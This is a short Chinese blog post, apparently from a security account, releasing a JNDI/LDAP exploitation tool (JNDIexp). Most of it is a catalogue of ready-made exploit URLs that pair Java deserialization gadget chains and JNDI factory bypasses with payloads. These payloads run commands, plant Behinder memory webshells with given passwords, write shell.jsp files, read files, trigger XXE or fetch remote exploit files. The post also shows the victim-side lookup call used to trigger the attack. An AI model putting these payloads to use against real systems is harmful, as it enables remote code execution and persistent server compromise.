#  ldap利用工具公开——JNDIexp  
原创 珂字辈
                        珂字辈  珂技知识分享   2026-07-06 07:17  
  
https://github.com/kezibei/JNDIexp  
  
刚学java不久写的利用工具，命令行，比较简陋，后面就是不断加  
gadget进去。  
  
用法和其他jndi利用工具一样，java -jar JNDIexp.jar，会在VPS(2.2.2.2)上监听1389端口。  
  
  
然后在靶机上执行  
```
new javax.naming.InitialContext().lookup("ldap://2.2.2.2:1389/deser:cb19:Y2FsYw==");
```  
  
deser为module，cb19为gadget，Y2FsYw==为payload。注意是用【:】分割而不是常见的【/】， 就是根据不同的环境更换它们三个，组合太多了，所以help里没有全部枚举，而是给了提示。  
  
  
比如  
```
ldap://127.0.0.1:1389/deser:cb110:base64[calc]
[*]cb all:tomcatecho/tomcatbehinder/weblogicecho/weblogicbehinder/springbehinder
```  
  
意思就是支持  
  
```
ldap://127.0.0.1:1389/deser:cb110:Y2FsYw==
ldap://127.0.0.1:1389/deser:cb110:tomcatecho
ldap://127.0.0.1:1389/deser:cb110:tomcatbehinder
```  
  
等等。  
  
  
此外注释一般是一些简陋的提示。比如  
  
  
```
ldap://127.0.0.1:1389/deser:cb19:base64[calc] // Y2FsYw==
```  
  
意思是cale的base64是  
Y2FsYw==  
  
```
ldap://127.0.0.1:1389/deser:cb19:tomcatbehinder // /[*] pass:Hlfyztssns Referer: Jluw
```  
  
意思是成功打入后任意可访问的接口都可以当内存马，密码  
Hlfyztssns，  
Referer是  
Jluw  
  
  
  
```
ldap://127.0.0.1:1389/deser:urldns:dnslog.com

ldap://127.0.0.1:1389/deser:fileread:1.ser[base64] // MS5zZXI=

ldap://127.0.0.1:1389/deser:cb19:base64[calc] // Y2FsYw==
ldap://127.0.0.1:1389/deser:cb19:tomcatecho // header cmd: whoami
ldap://127.0.0.1:1389/deser:cb19:tomcatbehinder // /[*] pass:Hlfyztssns Referer: Jluw
ldap://127.0.0.1:1389/deser:cb19:weblogicecho // header cmd: whoami
ldap://127.0.0.1:1389/deser:cb19:weblogicbehinder // /[*] pass:rebeyond
ldap://127.0.0.1:1389/deser:cb19:springbehinder // /[*] pass:Aqrgiwolx Referer: Myonodjv 必须已存在接口
ldap://127.0.0.1:1389/deser:cb18:base64[calc]
ldap://127.0.0.1:1389/deser:cb110:base64[calc]
[*]cb all:tomcatecho/tomcatbehinder/weblogicecho/weblogicbehinder/springbehinder

ldap://127.0.0.1:1389/deser:cck1:base64[calc]
ldap://127.0.0.1:1389/deser:cck2:base64[calc]
[*]cck1 cck2:tomcatecho/tomcatbehinder/weblogicecho/weblogicbehinder/springbehinder
ldap://127.0.0.1:1389/deser:cck3:base64[calc]
ldap://127.0.0.1:1389/deser:cck4:base64[calc]

ldap://127.0.0.1:1389/deser:jdk7u21:base64[calc]
[*]jdk7u21:tomcatecho/tomcatbehinder/weblogicecho/weblogicbehinder/springbehinder

ldap://127.0.0.1:1389/deser:jre8u20:base64[calc]
[*]jre8u20:tomcatecho/tomcatbehinder/weblogicecho/weblogicbehinder/springbehinder

ldap://127.0.0.1:1389/deser:fastjson1:base64[calc] //BadAttributeValueExpException,jdk>1.7
ldap://127.0.0.1:1389/deser:fastjson2:base64[calc] // HotSwappableTargetSource(spring-aop),jdk>1.7
ldap://127.0.0.1:1389/deser:fastjson2_jdk7:base64[calc] // HotSwappableTargetSource(spring-aop),jdk<=1.7
ldap://127.0.0.1:1389/deser:fastjson3:base64[calc] // EventListenerList,serialVersionUID
ldap://127.0.0.1:1389/deser:fastjson4:base64[calc] // TextAndMnemonicHashMap,serialVersionUID
[*]fastjson all:tomcatecho/tomcatbehinder/weblogicecho/weblogicbehinder/springbehinder

ldap://127.0.0.1:1389/deser:jackson1:base64[calc] // >2.9.9,50%,BadAttributeValueExpException(jdk>1.7)
ldap://127.0.0.1:1389/deser:jackson1_100:base64[calc] // >2.9.9,JdkDynamicAopProxy(spring-aop),BadAttributeValueExpException(jdk>1.7)
ldap://127.0.0.1:1389/deser:jackson2:base64[calc] // >2.9.9,HotSwappableTargetSource/JdkDynamicAopProxy(spring-aop)
ldap://127.0.0.1:1389/deser:jackson3:base64[calc] // >2.9.9,50%,EventListenerList(serialVersionUID)
ldap://127.0.0.1:1389/deser:jackson3_100:base64[calc] // >2.9.9,JdkDynamicAopProxy(spring-aop),EventListenerList(serialVersionUID)
ldap://127.0.0.1:1389/deser:jackson4:base64[calc] // >2.9.9,50%,TextAndMnemonicHashMap(serialVersionUID)
ldap://127.0.0.1:1389/deser:jackson4_100:base64[calc] // >2.9.9,JdkDynamicAopProxy(spring-aop),TextAndMnemonicHashMap(serialVersionUID)
[*]jackson all:tomcatecho/tomcatbehinder/weblogicecho/weblogicbehinder/springbehinder

ldap://127.0.0.1:1389/deser:rome1:base64[calc] // <= 1.11.1
ldap://127.0.0.1:1389/deser:rome1x:base64[calc] // = 1.0
ldap://127.0.0.1:1389/deser:rome2:base64[calc] // <= 1.11.1 and jdk > 1.7
ldap://127.0.0.1:1389/deser:rome2x:base64[calc] // = 1.0 and jdk > 1.7
ldap://127.0.0.1:1389/deser:rome2_jdk7:base64[calc] // <= 1.11.1 and jdk <= 1.7
ldap://127.0.0.1:1389/deser:rome2x_jdk7:base64[calc] // = 1.0 and jdk <= 1.7
[*]rome all:tomcatecho/tomcatbehinder/weblogicecho/weblogicbehinder/springbehinder

ldap://127.0.0.1:1389/deser:c3p095:base64[http://127.0.0.1/exp]
ldap://127.0.0.1:1389/deser:c3p092:base64[http://127.0.0.1/exp]
ldap://127.0.0.1:1389/deser:c3p095el:base64[calc]
ldap://127.0.0.1:1389/deser:c3p092el:base64[calc]
[*]c3p0 el:tomcatecho/tomcatbehinder/weblogicecho/springbehinder

ldap://127.0.0.1:1389/deser:bsh20b4:base64[calc]
ldap://127.0.0.1:1389/deser:bsh20b5:base64[calc]

ldap://127.0.0.1:1389/deser:groovy23:base64[calc]
ldap://127.0.0.1:1389/deser:groovy24:base64[calc]

ldap://127.0.0.1:1389/deser:ajw:base64[../ahi.txt:ahihihi]

ldap://127.0.0.1:1389/deser:weblogic12:base64[calc] //CVE-2021-2135

ldap://127.0.0.1:1389/deser:rhino:base64[calc] // serialVersionUID
[*]rhino:tomcatecho/tomcatbehinder/weblogicecho/weblogicbehinder/springbehinder

ldap://127.0.0.1:1389/deser:springaop21:base64[calc] // serialVersionUID
ldap://127.0.0.1:1389/deser:springaop22:base64[calc] // serialVersionUID
[*]springaop all:tomcatecho/tomcatbehinder/weblogicecho/weblogicbehinder/springbehinder

ldap://127.0.0.1:1389/BeanFactory:elbypass:base64[calc]
[*]elbypass:tomcatecho/tomcatbehinder/weblogicecho/springbehinder
ldap://127.0.0.1:1389/BeanFactory:bshbypass:base64[calc]
[*]bshbypass:tomcatecho/tomcatbehinder/weblogicecho/springbehinder
ldap://127.0.0.1:1389/BeanFactory:groovyclassloaderbypass:base64[calc]
ldap://127.0.0.1:1389/BeanFactory:groovyshellbypass:base64[calc]
ldap://127.0.0.1:1389/BeanFactory:yamlbypass:base64[http://127.0.0.1/exp.jar]
ldap://127.0.0.1:1389/BeanFactory:xsloaderbypass:base64[http://127.0.0.1/evil.xml]
ldap://127.0.0.1:1389/BeanFactory:xstreambypass:base64[calc]
ldap://127.0.0.1:1389/BeanFactory:mvelbypass:base64[calc]
ldap://127.0.0.1:1389/BeanFactory:libloaderbypass:base64[../../upload/exp]
ldap://127.0.0.1:1389/BeanFactory:configbypass:base64[http://127.0.0.1/exp.properties]
ldap://127.0.0.1:1389/BeanFactory:svgbypass:base64[http://127.0.0.1/RCE.svg]

ldap://127.0.0.1:1389/CommonsDbcp1Factory:h2bypass:base64[calc] //RCE
[*]h2bypass:tomcatecho/tomcatbehinder/weblogicecho/springbehinder
ldap://127.0.0.1:1389/CommonsDbcp1Factory:postgresqlbypass1:base64[../shell.jsp] //write file
ldap://127.0.0.1:1389/CommonsDbcp1Factory:postgresqlbypass2:base64[http://127.0.0.1/exp.xml] //load spring xml
ldap://127.0.0.1:1389/CommonsDbcp1Factory:mysql5bypass:base64[127.0.0.1:3306@root] //fake mysql read file
ldap://127.0.0.1:1389/CommonsDbcp1Factory:mysql8bypass:base64[127.0.0.1:3306@root] //fake mysql read file
ldap://127.0.0.1:1389/CommonsDbcp1Factory:mysqlbypass:base64[127.0.0.1:3306@root@123456@C://windows//win.ini] //true mysql read file
ldap://127.0.0.1:1389/CommonsDbcp1Factory:fabricbypass:base64[127.0.0.1:8080] //XXE
ldap://127.0.0.1:1389/CommonsDbcp1Factory:oraclebypass1:base64[127.0.0.1:1521] //get user
ldap://127.0.0.1:1389/CommonsDbcp1Factory:oraclebypass2:base64[1.xml] //XXE
ldap://127.0.0.1:1389/CommonsDbcp1Factory:db2bypass:base64[../webapps/ROOT/shell.jsp] or base64[qqq@shell.jsp] //write file
ldap://127.0.0.1:1389/CommonsDbcp1Factory:sqlitebypass1:base64[http://127.0.0.1/1.so] //RCE only linux
ldap://127.0.0.1:1389/CommonsDbcp1Factory:sqlitebypass2:base64[http://127.0.0.1/default.db@../webapps/ROOT/shell.jsp@3C256F75742E7072696E746C6E282248656C6C6F20776F726C6422293B253E] //write file

ldap://127.0.0.1:1389/CommonsDbcp2Factory:h2bypass:base64[calc]
[*]h2bypass:tomcatecho/tomcatbehinder/weblogicecho/springbehinder
[*]CommonsDbcp2Factory:postgresqlbypass1/postgresqlbypass2/mysql5bypass/mysql8bypass/mysqlbypass/fabricbypass/oraclebypass1/oraclebypass2/db2bypass/sqlitebypass1/sqlitebypass2/derbybypass

ldap://127.0.0.1:1389/TomcatDbcp1Factory:h2bypass:base64[calc]
[*]h2bypass:tomcatecho/tomcatbehinder/weblogicecho/springbehinder
[*]TomcatDbcp1Factory:postgresqlbypass1/postgresqlbypass2/mysql5bypass/mysql8bypass/mysqlbypass/fabricbypass/oraclebypass1/oraclebypass2/db2bypass/sqlitebypass1/sqlitebypass2/derbybypass

ldap://127.0.0.1:1389/TomcatDbcp2Factory:h2bypass:base64[calc]
[*]h2bypass:tomcatecho/tomcatbehinder/weblogicecho/springbehinder
[*]TomcatDbcp2Factory:postgresqlbypass1/postgresqlbypass2/mysql5bypass/mysql8bypass/mysqlbypass/fabricbypass/oraclebypass1/oraclebypass2/db2bypass/sqlitebypass1/sqlitebypass2/derbybypass

ldap://127.0.0.1:1389/ResourceFactory:h2bypass:base64[calc]
[*]h2bypass:tomcatecho/tomcatbehinder/weblogicecho/springbehinder
[*]ResourceFactory:postgresqlbypass1/postgresqlbypass2/mysql5bypass/mysql8bypass/mysqlbypass/fabricbypass/oraclebypass1/oraclebypass2/db2bypass/sqlitebypass1/sqlitebypass2/derbybypass

ldap://127.0.0.1:1389/TomcatJdbcFactory:h2bypass:base64[calc]
[*]h2bypass:tomcatecho/tomcatbehinder/weblogicecho/springbehinder
[*]TomcatJdbcFactory:postgresqlbypass1/postgresqlbypass2/mysql5bypass/mysql8bypass/mysqlbypass/fabricbypass/oraclebypass1/oraclebypass2/db2bypass/sqlitebypass1

ldap://127.0.0.1:1389/DruidFactory:h2bypass:base64[calc]
[*]h2bypass:tomcatecho/tomcatbehinder/weblogicecho/springbehinder
[*]DruidFactory:postgresqlbypass1/postgresqlbypass2/mysql5bypass/mysql8bypass/mysqlbypass/fabricbypass/oraclebypass1/oraclebypass2/db2bypass/sqlitebypass1/sqlitebypass2/derbybypass

ldap://127.0.0.1:1389/HikariJNDIFactory:h2bypass:base64[calc]
[*]h2bypass:tomcatecho/tomcatbehinder/weblogicecho/springbehinder
[*]HikariJNDIFactory:postgresqlbypass1/postgresqlbypass2/mysql5bypass/mysql8bypass/mysqlbypass/fabricbypass/oraclebypass1/oraclebypass2/db2bypass/sqlitebypass1

ldap://127.0.0.1:1389/UserDatabaseFactory:xxebypass:base64[http://127.0.0.1:8080/evil.xml]
ldap://127.0.0.1:1389/UserDatabaseFactory:filebypass:base64[http://127.0.0.1:5000/../../webapps/ROOT/test.jsp]

ldap://127.0.0.1:1389/GenericFactory:configbypass:base64[http://127.0.0.1/exp.properties]
ldap://127.0.0.1:1389/GenericFactory:svgbypass:base64[http://127.0.0.1/RCE.svg]

ldap://127.0.0.1:1389/JavaBeanObjectFactory:cb19:Y2FsYw== //c3p0, all deser
ldap://127.0.0.1:1389/JavaBeanObjectFactory:svgbypass:base64[http://127.0.0.1/RCE.svg]
ldap://127.0.0.1:1389/LdapCtxFactory:cb19:Y2FsYw== //all deser

ldap://127.0.0.1:1389/ServiceFactory:xxebypass:base64[http://127.0.0.1:8080/poc.wsdl]
```  
  
  
